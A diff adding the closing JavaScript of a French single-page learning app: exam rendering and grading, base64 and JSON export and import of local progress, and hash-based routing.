+  var u = user(); if (!u) return;
+  var html = '<div class="card"><h2>📝 Examens N6</h2>';
+  var types = ['partiel','final'];
+  for (var i = 0; i < types.length; i++) {
+    var type = types[i];
+    var e = EXAMENS[type];
+    var passed = u.examens['6_' + type];
+    var ready = true;
+    for (var j = 0; j < e.req.length; j++) { if (!u.done['6_' + e.req[j]]) { ready = false; break; } }
+    var cls = 'exam-card ' + (passed ? 'passed' : (ready ? '' : 'locked'));
+    html += '<div class="' + cls + '"><h4>' + e.titre + '</h4><p style="font-size:.85em;color:#cbd5e1">' + e.desc + '</p>';
+    if (passed) html += '<p style="color:#86efac;font-size:.85em">✅ ' + passed + '</p><button class="green" onclick="go(\'examen/' + type + '\')">Refaire</button>';
+    else if (ready) html += '<button class="gold" onclick="go(\'examen/' + type + '\')">Passer</button>';
+    else html += '<p style="color:#fbbf24;font-size:.82em">🔒 Défis ' + e.req.join(', ') + '</p>';
+    html += '</div>';
+  }
+  html += '</div>';
+  document.getElementById('app').innerHTML = html;
+}
+
+function renderExamen(type) {
+  var u = user(); if (!u) return;
+  var e = EXAMENS[type]; if (!e) { go('examens'); return; }
+  var ready = true;
+  for (var j = 0; j < e.req.length; j++) { if (!u.done['6_' + e.req[j]]) { ready = false; break; } }
+  if (!ready) { alert('Valide les défis requis.'); go('examens'); return; }
+  var html = '<div class="card"><h2>' + e.titre + '</h2><p style="color:#94a3b8;font-size:.85em">' + e.desc + '</p><div class="quiz">';
+  for (var qi = 0; qi < e.qs.length; qi++) {
+    var q = e.qs[qi];
+    html += '<div class="q" data-i="' + qi + '"><p>Q' + (qi + 1) + '. ' + q.q + '</p>';
+    for (var oi = 0; oi < q.o.length; oi++) {
+      html += '<label><input type="radio" name="ex' + qi + '" value="' + oi + '"> ' + q.o[oi] + '</label>';
+    }
+    html += '<div class="exp" id="exexp' + qi + '">' + q.e + '</div></div>';
+  }
+  html += '<button onclick="validerExamen(\'' + type + '\')">Soumettre</button><div id="er"></div></div></div>';
+  document.getElementById('app').innerHTML = html;
+}
+
+function validerExamen(type) {
+  var u = user(); if (!u) return;
+  var e = EXAMENS[type]; if (!e) return;
+  var correct = 0;
+  for (var qi = 0; qi < e.qs.length; qi++) {
+    var q = e.qs[qi];
+    var sel = document.querySelector('input[name="ex' + qi + '"]:checked');
+    var labels = document.querySelectorAll('.q[data-i="' + qi + '"] label');
+    for (var li = 0; li < labels.length; li++) { labels[li].classList.remove('ok','ko'); }
+    var ex = document.getElementById('exexp' + qi); if (ex) ex.style.display = 'block';
+    if (sel && parseInt(sel.value) === q.c) { correct++; labels[q.c].classList.add('ok'); }
+    else { labels[q.c].classList.add('ok'); if (sel) labels[parseInt(sel.value)].classList.add('ko'); }
+  }
+  var pct = Math.round(correct / e.qs.length * 100);
+  var req = type === 'final' ? 80 : 60;
+  var pass = pct >= req;
+  if (pass) { u.examens['6_' + type] = today(); save(); }
+  var r = document.getElementById('er');
+  r.className = 'res ' + (pass ? 'g' : 'r');
+  r.textContent = pass ? '🎉 ' + correct + '/' + e.qs.length + ' (' + pct + '%)' : correct + '/' + e.qs.length + ' (' + pct + '%) — Il faut ' + req + '%';
+}
+
+function b64(s) { try { return btoa(unescape(encodeURIComponent(s))); } catch(e) { return ''; } }
+function unb64(b) { try { return decodeURIComponent(escape(atob(b.replace(/\s/g,'')))); } catch(e) { return null; } }
+function exportCode() { return b64(JSON.stringify(state)); }
+function importCode(c) { var j = unb64(c.trim()); if (!j) return false; try { var d = JSON.parse(j); if (!d) return false; state = Object.assign({}, state, d); save(); return true; } catch(e) { return false; } }
+function dlBackup() { var b = new Blob([JSON.stringify(state, null, 2)], {type:'application/json'}); var url = URL.createObjectURL(b); var a = document.createElement('a'); a.href = url; a.download = 'mdpc-n6-' + today() + '.json'; document.body.appendChild(a); a.click(); document.body.removeChild(a); URL.revokeObjectURL(url); }
+function readFile(input) { var f = input.files[0]; if (!f) return; var r = new FileReader(); r.onload = function(e) { try { var d = JSON.parse(e.target.result); state = Object.assign({}, state, d); save(); alert('Restauré !'); route(); } catch(err) { alert('Fichier invalide'); } }; r.readAsText(f); }
+
+function renderSync() {
+  var u = user();
+  var code = exportCode();
+  var html = '<div class="card"><h2>🌐 Synchronisation</h2></div>';
+  html += '<div class="card"><h3>📋 Code</h3><div class="sync-box"><label>Ton code</label><textarea id="so" readonly onclick="this.select()">' + code + '</textarea><div class="sync-actions"><button onclick="copyCode()">Copier</button></div></div>';
+  html += '<div class="sync-box"><label>Coller un code</label><textarea id="si" placeholder="Colle ici..."></textarea><div class="sync-actions"><button class="green" onclick="applyCode()">Restaurer</button></div></div></div>';
+  html += '<div class="card"><h3>💾 Fichier</h3><div class="sync-actions"><button onclick="dlBackup()">Télécharger</button><input type="file" id="bf" accept=".json" style="display:none" onchange="readFile(this)"><button class="sec" onclick="document.getElementById(\'bf\').click()">Importer</button></div></div>';
+  document.getElementById('app').innerHTML = html;
+}
+function copyCode() { var ta = document.getElementById('so'); ta.select(); try { document.execCommand('copy'); alert('Copié !'); } catch(e) { alert('Manuel'); } }
+function applyCode() { var c = document.getElementById('si').value; if (!c.trim()) { alert('Colle un code.'); return; } if (importCode(c)) { alert('Restauré !'); route(); } else alert('Code invalide.'); }
+
+function route() {
+  try {
+    updateHeader();
+    if (!state.currentUser) { renderLogin(); return; }
+    if (!isUnlocked(6)) { renderLocked(); return; }
+    var h = (location.hash || '#home').slice(1);
+    var p = h.split('/');
+    if (p[0] === 'home' || p[0] === '') return renderHome();
+    if (p[0] === 'defi' && p[1]) return renderDefi(parseInt(p[1]));
+    if (p[0] === 'certif') return renderCertif();
+    if (p[0] === 'cv') return renderCV();
+    if (p[0] === 'stats') return renderStats();
+    if (p[0] === 'jobs') return renderJobs();
+    if (p[0] === 'examens') return renderExamens();
+    if (p[0] === 'examen' && p[1]) return renderExamen(p[1]);
+    if (p[0] === 'certs') return renderCerts();
+    if (p[0] === 'sync') return renderSync();
+    if (p[0] === 'login') return renderLogin();
+    renderHome();
+  } catch(e) {
+    console.error('Route error:', e);
+    document.getElementById('app').innerHTML = '<div class="card"><h2 style="color:#ef4444">Erreur</h2><p style="color:#ef4444">' + e.message + '</p></div>';
+  }
+}
+window.addEventListener('hashchange', route);
+try { route(); } catch(e) {
+  document.getElementById('app').innerHTML = '<div class="card"><h2 style="color:#ef4444">Erreur init</h2><p style="color:#ef4444">' + e.message + '</p></div>';
+}
+</script>
+</body>
+</html>
